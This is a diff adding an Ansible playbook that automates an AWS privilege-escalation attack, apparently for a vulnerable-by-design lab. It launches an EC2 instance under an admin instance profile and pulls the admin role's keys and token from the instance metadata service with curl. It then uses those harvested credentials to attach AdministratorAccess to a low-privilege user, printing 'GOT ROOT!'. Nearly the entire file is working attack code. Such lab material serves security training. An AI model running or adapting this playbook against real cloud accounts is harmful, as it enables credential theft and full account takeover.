@@ -1,0 +1,131 @@
+- hosts: localhost
+  gather_facts: True
+  vars_files: "../group_vars/vars.yml"
+  vars:
+    - playbook_name: 'privesc3-CreateEC2WithExistingInstanceProfile.yml'
+  tasks:
+  
+    - name: Create a new EC2 key
+      ec2_key:
+          name: gremlins
+          region: "{{ aws_region }}"
+          state: present
+      register: ec2_key_result
+
+    - name: Save private key
+      copy: content="{{ ec2_key_result.key.private_key }}" dest="{{ prives3_gremlins_ec2_key }}" mode=0400
+      when: ec2_key_result.changed
+
+    - name: Run CreateEC2WithExistingInstanceProfile admin_instance_profile
+      shell: aws ec2 run-instances --image-id ami-a4dc46db --instance-type t2.micro --key-name "gremlins" --iam-instance-profile Name=admin_instance_profile --profile privesc3 --region "{{ aws_region }}"
+      register: result1
+      ignore_errors: yes
+
+    - name: Json response for created ec2 instance 
+      debug:
+        msg: '{{ result1.stdout }}'
+
+    - name: Set Instance ID Fact
+      set_fact: InstanceId='{{ result1.stdout | from_json | json_query("Instances") | json_query("[0]") | json_query("InstanceId") }}'
+
+    - name: Instance ID 
+      debug:
+        msg: '{{ InstanceId }}'
+
+    - name: Sleep for 3 minutes until instance is fully running 
+      wait_for:
+        timeout: 180
+      delegate_to: localhost
+
+    - name: Ec2 instance get facts 
+      shell: aws ec2 describe-instances --instance-id "{{ InstanceId }}" --profile privesc3 --region "{{ aws_region }}"
+      register: result2
+      ignore_errors: yes
+
+    - name: Json response for ec2 instance facts 
+      debug:
+        msg: '{{ result2.stdout }}'
+  
+
+    - name: Set Public IP fact
+      set_fact: PublicIpAddress='{{ result2.stdout | from_json | json_query("Reservations") | json_query("[0]") | json_query("Instances") | json_query("[0]") | json_query("NetworkInterfaces") | json_query("[0]") | json_query("Association") | json_query("PublicIp") }}'
+
+    - name: Public IP
+      debug:
+        msg: '{{ PublicIpAddress }}'
+
+    - name: Store keys for ec2 instance in known_hosts file 
+      shell: ssh-keyscan '{{ PublicIpAddress }}' >> ~/.ssh/known_hosts
+
+    - name: Add ec2 host to group 'priv_esc_3'
+      add_host:
+        name: '{{ PublicIpAddress }}'
+        groups: priv_esc_3
+
+- hosts: priv_esc_3
+  remote_user: ubuntu
+  gather_facts: True
+  vars_files: "../group_vars/vars.yml"
+  vars:
+    ansible_ssh_private_key_file: "{{ prives3_gremlins_ec2_key }}"
+  tasks:
+    - name: Create AWS metadata token variable named TOKEN
+      shell:
+        cmd: echo ${TOKEN}
+      environment:
+        TOKEN: 'curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"'
+
+    - name: Curl for admin_access role credentials 
+      shell: 'curl -H "X-aws-ec2-metadata-token: $TOKEN" -v curl http://169.254.169.254/latest/meta-data/iam/security-credentials/admin_access'
+      register: result3
+      ignore_errors: yes
+
+    - name: Json response for admin creds
+      debug:
+        msg: '{{ result3.stdout }}'
+
+    - name: Set _Admin_Access_ID Fact
+      set_fact: Admin_Access_ID='{{ result3.stdout | from_json | json_query("AccessKeyId") }}'
+
+    - name: Admin_Access_ID
+      debug:
+        msg: '{{ Admin_Access_ID }}'
+
+    - name: Set Admin_Access_Key Fact
+      set_fact: Admin_Access_Key='{{ result3.stdout | from_json | json_query("SecretAccessKey") }}'
+
+    - name: Admin_Access_Key
+      debug:
+        msg: '{{ Admin_Access_Key }}'
+
+    - name: Set Admin_Token Fact
+      set_fact: Admin_Token='{{ result3.stdout | from_json | json_query("Token") }}'
+
+    - name: Admin_Token
+      debug:
+        msg: '{{ Admin_Token }}'
+
+    # - debug:
+    #     var: "{{ hostvars }}"
+
+- hosts: localhost
+  gather_facts: True
+  vars_files: "../group_vars/vars.yml"
+  tasks:
+    - name: Attach admin policy to privesc3 user using harvested credentials 
+      iam_user:
+        aws_access_key: "{{ hostvars[PublicIpAddress]['Admin_Access_ID'] }}"
+        aws_secret_key: "{{ hostvars[PublicIpAddress]['Admin_Access_Key'] }}"
+        security_token: "{{ hostvars[PublicIpAddress]['Admin_Token'] }}"
+        name: "{{ privesc3 }}"
+        state: present 
+        managed_policies:
+          - arn:aws:iam::aws:policy/AdministratorAccess
+      register: final_result
+
+
+    - name: Json response for admin policy attachment - GOT ROOT!
+      debug:
+        msg: '{{ final_result }}'
+
+        
